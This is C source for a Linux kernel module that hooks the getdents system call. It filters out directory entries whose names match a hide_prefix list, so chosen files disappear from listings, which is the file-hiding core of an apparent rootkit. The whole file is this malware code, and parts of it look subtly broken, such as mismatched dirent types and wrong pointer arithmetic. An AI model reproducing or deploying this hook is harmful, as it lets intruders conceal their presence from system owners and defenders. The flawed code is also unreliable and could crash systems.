#include "../headers/all.h"
#include "../headers/HJ_ls.h"


EXPORT_SYMBOL(my_getdents);


extern asmlinkage int
(*original_getdents)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int
my_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
	int str_idx;
	unsigned int ret;
	char *ptr, *tmp;
	struct dirent *buf;
	struct dirent *curr;
	struct dirent *prev = NULL;
	ret = (*original_getdents)(fd, dirp, count);
	/*char *(hide_prefix_dym[0]);*/
	/*setHideStr(hide_prefix_dym);*/
	
	/*printk("%s\n",hide_prefix_dym[0]);*/


	if(ret){
	
			buf = kmalloc(ret, GFP_KERNEL);
			copy_from_user(buf, dirp,ret);
			ptr = (char *)buf;
flag1:		while(ptr < (char *)buf + ret) {
				curr = (struct dirent *)ptr;
				str_idx = 0; 
				tmp = hide_prefix[str_idx];

				/*printk("found dir %s\n", curr->d_name);*/
				while(tmp){
					if(strstr(curr->d_name, tmp)){
						/*if(strstr(curr->d_name,"hide_"))*/
							/*[>printk("found %s the prev is %s, the curr is %s\n", curr->d_name, prev->d_name, curr->d_name);<]*/
						if(curr != buf)	{
							prev->d_reclen += curr->d_reclen;
							goto find;
						}
						else{
							ret -= curr->d_reclen;
							memcpy(curr, curr + curr->d_reclen, ret);
							goto flag1;
						}
					}else{
						tmp  = hide_prefix[++str_idx];
						continue; 
					}
				}
				goto notfound;
find:			ptr += curr->d_reclen;
				goto flag1;
notfound:		prev = curr;                  
				ptr += curr->d_reclen;
			}	
			copy_to_user(dirp, buf, ret);
			printk("%d \n",ret);
			kfree(buf);
	}
	return ret;
}
